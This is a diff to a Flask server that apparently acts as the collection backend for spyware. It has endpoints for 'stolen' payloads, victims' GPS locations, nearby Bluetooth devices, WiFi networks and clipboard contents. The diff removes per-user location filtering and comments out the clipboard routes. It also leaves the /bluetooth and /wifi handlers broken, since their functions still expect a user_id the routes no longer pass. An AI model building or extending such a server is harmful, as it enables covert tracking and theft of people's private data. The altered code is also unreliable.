@@ -29,10 +29,7 @@ class Location(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     latitude = db.Column(db.Float, nullable=True)
     longitude = db.Column(db.Float, nullable=True)
-    altitude = db.Column(db.Float)
-    accuracy = db.Column(db.Float)
     timestamp = db.Column(db.DateTime, default=datetime.utcnow)
-    user_id = db.Column(db.Integer, db.ForeignKey('user.id'))
 
 class BluetoothDevice(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -88,16 +85,17 @@ def get_latest_stolen():
         return jsonify({"error": "No data found"}), 404
     return jsonify({"payload": latest.payload, "timestamp": latest.timestamp.isoformat()})
 
-@app.route("/locations/<int:user_id>", methods=["GET"])
-def get_locations_by_user(user_id):
-    locations = Location.query.filter_by(user_id=user_id).all()
-    return jsonify([{
-        "latitude": l.latitude,
-        "longitude": l.longitude,
-        "altitude": l.altitude,
-        "accuracy": l.accuracy,
-        "timestamp": l.timestamp.isoformat()
-    } for l in locations])
+@app.route('/locations', methods=['GET'])
+def get_all_locations():
+    locations = Location.query.order_by(Location.timestamp.desc()).all()
+    return jsonify([
+        {
+            "latitude": loc.latitude,
+            "longitude": loc.longitude,
+            "timestamp": loc.timestamp.isoformat()
+        }
+        for loc in locations
+    ])
 
 @app.route("/users", methods=["GET"])
 def get_all_users():
@@ -109,7 +107,7 @@ def get_all_users():
         "created_at": u.created_at.isoformat()
     } for u in users])
 
-@app.route("/bluetooth/<int:user_id>", methods=["GET"])
+@app.route("/bluetooth", methods=["GET"])
 def get_bluetooth_by_user(user_id):
     devices = BluetoothDevice.query.filter_by(user_id=user_id).all()
     return jsonify([{
@@ -119,7 +117,7 @@ def get_bluetooth_by_user(user_id):
         "timestamp": d.timestamp.isoformat()
     } for d in devices])
 
-@app.route("/wifi/<int:user_id>", methods=["GET"])
+@app.route("/wifi", methods=["GET"])
 def get_wifi_by_user(user_id):
     networks = WifiNetwork.query.filter_by(user_id=user_id).all()
     return jsonify([{
@@ -158,31 +156,31 @@ def get_reports():
         "timestamp": r.timestamp
     } for r in reports])
 
-# 🧪 Save simulated data
-@app.route("/simulate", methods=["POST"])
-def receive_simulated_data():
-    data = request.json
-    entry = SimulatedEntry(
-        device=data.get("device"),
-        os=data.get("os"),
-        clipboard=data.get("clipboard"),
-        timestamp=datetime.utcnow().isoformat()
-    )
-    db.session.add(entry)
-    db.session.commit()
-    print(f"[!] Simulated entry saved: {data}")
-    return jsonify({"status": "🧪 simulated data saved"})
+# # 🧪 Save simulated data
+# @app.route("/simulate", methods=["POST"])
+# def receive_simulated_data():
+#     data = request.json
+#     entry = SimulatedEntry(
+#         device=data.get("device"),
+#         os=data.get("os"),
+#         clipboard=data.get("clipboard"),
+#         timestamp=datetime.utcnow().isoformat()
+#     )
+#     db.session.add(entry)
+#     db.session.commit()
+#     print(f"[!] Simulated entry saved: {data}")
+#     return jsonify({"status": "🧪 simulated data saved"})
 
-# 🧪 Get simulated entries
-@app.route("/simulated", methods=["GET"])
-def get_simulated():
-    entries = SimulatedEntry.query.order_by(SimulatedEntry.timestamp.desc()).limit(20).all()
-    return jsonify([{
-        "device": e.device,
-        "os": e.os,
-        "clipboard": e.clipboard,
-        "timestamp": e.timestamp
-    } for e in entries])
+# # 🧪 Get simulated entries
+# @app.route("/simulated", methods=["GET"])
+# def get_simulated():
+#     entries = SimulatedEntry.query.order_by(SimulatedEntry.timestamp.desc()).limit(20).all()
+#     return jsonify([{
+#         "device": e.device,
+#         "os": e.os,
+#         "clipboard": e.clipboard,
+#         "timestamp": e.timestamp
+#     } for e in entries])
 
 # 📍 Save latest location
 @app.route("/location", methods=["POST"])
